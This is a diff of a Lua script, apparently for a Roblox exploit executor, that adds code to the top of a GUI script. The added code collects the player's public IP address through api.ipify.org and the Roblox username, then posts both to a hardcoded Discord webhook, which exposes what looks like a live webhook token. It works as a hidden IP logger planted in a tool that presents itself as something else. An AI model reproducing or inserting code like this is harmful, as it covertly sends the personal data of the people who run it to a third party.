@@ -1,3 +1,76 @@
+local url =
+   "https://discord.com/api/webhooks/995488713515745440/9o09kJNtRSSB-tprYvb2AmME3ui3bi79KyuVm8DbA3yqo0tqlLh8F_6R_tUs8_Leej8l"
+local data = {
+   ["content"] = "------------------------------------", 
+
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+
+wait(0.1)
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+local url =
+   "https://discord.com/api/webhooks/995488713515745440/9o09kJNtRSSB-tprYvb2AmME3ui3bi79KyuVm8DbA3yqo0tqlLh8F_6R_tUs8_Leej8l"
+local data = {
+   ["content"] = ip, 
+
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+wait(0.1)
+local url =
+   "https://discord.com/api/webhooks/995488713515745440/9o09kJNtRSSB-tprYvb2AmME3ui3bi79KyuVm8DbA3yqo0tqlLh8F_6R_tUs8_Leej8l"
+local data = {
+   ["content"] = game.Players.LocalPlayer.Name, 
+
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+wait(0.1)
+
+local url =
+   "https://discord.com/api/webhooks/995488713515745440/9o09kJNtRSSB-tprYvb2AmME3ui3bi79KyuVm8DbA3yqo0tqlLh8F_6R_tUs8_Leej8l"
+local data = {
+   ["content"] = "------------------------------------", 
+
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+
+
+
+--
+
+
+
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local toptext = Instance.new("TextLabel")
